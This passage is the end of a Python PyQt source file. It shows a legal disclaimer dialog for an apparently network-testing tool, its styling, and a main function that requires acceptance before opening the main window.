• Unauthorized network access is ILLEGAL and may result in:
  - Criminal charges
  - Imprisonment (up to 10+ years)
  - Fines up to $100,000+
  - Criminal Record
  - Civil Lawsuits

✓ AUTHORIZED USE ONLY:
═══════════════════════════════════════════════════════════════════

You may use this tool ONLY if you have:
  ✓ Written permission from the network owner
  ✓ Authorization from your institution/employer
  ✓ Lawful purpose (education, authorized testing)
  ✓ Legal right to test the network

❌ PROHIBITED USES:
═══════════════════════════════════════════════════════════════════

This tool must NOT be used for:
  ✗ Unauthorized network access
  ✗ Stealing passwords or data
  ✗ Disrupting network services
  ✗ Malicious purposes
  ✗ Criminal activity

📋 CONSEQUENCES:
═══════════════════════════════════════════════════════════════════

The author is NOT responsible for:
  • Illegal use of this software
  • Damages from unauthorized access
  • Criminal prosecution results
  • Any harm to systems or data

YOU ARE SOLELY RESPONSIBLE FOR ALL ACTIONS.

By clicking "I Understand", you acknowledge:
  1. You have authorization to use this tool
  2. You understand the legal consequences
  3. You will use it only for authorized purposes
  4. You accept full legal responsibility
"""
    
    disclaimer_dialog.setText(disclaimer_text)
    disclaimer_dialog.setDefaultButton(QMessageBox.Cancel)
    
    # Add custom buttons
    disclaimer_dialog.setStandardButtons(QMessageBox.Ok | QMessageBox.Cancel)
    
    # Style the dialog
    disclaimer_dialog.setStyleSheet("""
        QMessageBox {
            background-color: #050810;
            color: #e6faff;
            font-family: 'JetBrains Mono';
            font-size: 10px;
        }
        QMessageBox QLabel {
            color: #e6faff;
            background-color: #050810;
        }
        QPushButton {
            background-color: #0066cc;
            color: #ffffff;
            border: 1px solid #00aaff;
            padding: 8px 20px;
            border-radius: 4px;
            font-weight: bold;
        }
        QPushButton:hover {
            background-color: #0080ff;
            border: 1px solid #00ffff;
        }
        QPushButton:pressed {
            background-color: #004499;
        }
    """)
    
    result = disclaimer_dialog.exec()
    return result == QMessageBox.Ok

# ===================== MAIN =====================

def main():
    app = QApplication(sys.argv)
    
    # Show disclaimer on startup
    if not show_educational_disclaimer():
        print("User declined educational disclaimer. Exiting.")
        sys.exit(1)
    
    win = MainWindow()
    win.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()